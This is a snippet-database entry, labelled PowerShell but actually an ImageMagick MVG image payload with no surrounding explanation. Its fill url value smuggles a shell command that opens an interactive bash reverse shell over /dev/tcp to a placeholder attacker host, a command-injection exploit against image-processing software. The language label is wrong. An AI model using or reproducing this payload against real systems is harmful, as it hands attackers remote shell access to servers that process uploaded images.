---
id: 0d5af7ff-6c7a-42ce-b194-4a2cc5ce67d9
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:41.141641+00:00'
updated_at: '2023-04-10T20:24:35.337416+00:00'
---

# Code Snippet 0d5af7ff

**Language**: Powershell

```powershell
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
